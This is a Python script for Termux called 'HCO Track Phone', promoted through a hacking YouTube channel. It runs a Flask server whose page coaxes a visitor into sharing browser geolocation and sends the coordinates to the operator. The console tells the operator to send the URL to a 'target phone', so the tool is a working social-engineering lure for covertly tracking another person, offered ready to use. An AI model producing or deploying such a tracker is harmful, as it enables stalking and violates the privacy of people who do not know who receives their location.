# HCO Track Phone by Azhar
# Save as hco_track.py and run: python hco_track.py

import os
import sys
import subprocess
import threading
import time
import socket
from flask import Flask, request, render_template_string

RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

locations = {}
app = Flask(__name__)

def install_requirements():
    print(f"{YELLOW}Installing requirements...{RESET}")
    os.system('pkg update -y > /dev/null 2>&1')
    os.system('pkg install python -y > /dev/null 2>&1')
    os.system('pip install flask qrcode[pil] > /dev/null 2>&1')
    print(f"{GREEN}Requirements installed!{RESET}")

def tool_lock():
    os.system('clear')
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
    print(f"{RED}║{'Subscribe @hackers_colony_tech'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}")
    time.sleep(2)
    os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1')
    input(f"{YELLOW}Press ENTER after subscribing...{RESET}")

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def find_port():
    for port in range(8080, 8100):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('0.0.0.0', port))
                return port
        except:
            continue
    return 8080

@app.route('/')
def home():
    return '''
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>body{background:#000;color:#fff;text-align:center;font-family:Arial;padding:20px;}
    .btn{background:#0f0;color:#000;border:none;padding:20px;font-size:18px;border-radius:10px;margin:20px;}
    .msg{padding:15px;background:#222;border-radius:10px;margin:10px;}
    .title{color:red;font-size:24px;font-weight:bold;margin:20px;text-shadow:0 0 10px red;}</style></head>
    <body>
        <div class="title">HCO TRACK PHONE BY AZHAR</div>
        <div class="msg">Click button → Allow location → Done</div>
        <button class="btn" onclick="getLoc()">📍 GET LOCATION</button>
        <div id="status" class="msg">Ready to track location</div>
        <script>
        function getLoc(){
            var s=document.getElementById('status');
            var b=document.querySelector('.btn');
            s.innerHTML='Requesting location access...';
            b.disabled=true;
            
            if(!navigator.geolocation){
                s.innerHTML='Browser not supported';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                function(pos){
                    s.innerHTML='Sending location...';
                    fetch('/update',{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude})
                    }).then(r=>r.text()).then(d=>{
                        s.innerHTML='✅ Location Sent! God Bless You 🙏';
                        b.style.display='none';
                    });
                },
                function(err){
                    s.innerHTML='Please allow location access and try again';
                    b.disabled=false;
                }
            );
        }
        </script>
    </body></html>
    '''

@app.route('/update', methods=['POST'])
def update():
    data = request.get_json()
    if data and 'lat' in data and 'lon' in data:
        locations.update(data)
        locations['time'] = time.time()
        print(f"{GREEN}Location received: {data['lat']}, {data['lon']}{RESET}")
        return "OK"
    return "ERROR"

def start_server(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def make_qr(url):
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=4, border=2)
        qr.add_data(url)
        qr.make()
        img = qr.make_image(fill_color="red", back_color="white")
        img.save("track_qr.png")
        os.system('termux-open track_qr.png > /dev/null 2>&1')
    except:
        pass

def main():
    tool_lock()
    install_requirements()
    
    os.system('clear')
    print(f"{GREEN}Starting HCO Track Phone...{RESET}")
    
    ip = get_ip()
    port = find_port()
    url = f"http://{ip}:{port}"
    
    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
    server_thread.start()
    time.sleep(2)
    
    make_qr(url)
    
    print(f"{RED}{'═'*60}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"{GREEN}📱 URL: {url}{RESET}")
    print(f"{YELLOW}📍 QR code opened! Send this URL to target phone{RESET}")
    print(f"{CYAN}💡 Make sure both phones are on same WiFi network{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"{YELLOW}⏳ Waiting for location... (Ctrl+C to stop){RESET}")
    
    last_time = 0
    while True:
        if 'time' in locations and locations['time'] > last_time:
            last_time = locations['time']
            print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
            print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
            print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
            print(f"{GREEN}Time: {time.ctime(locations['time'])}{RESET}")
        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 HCO Track Phone stopped{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
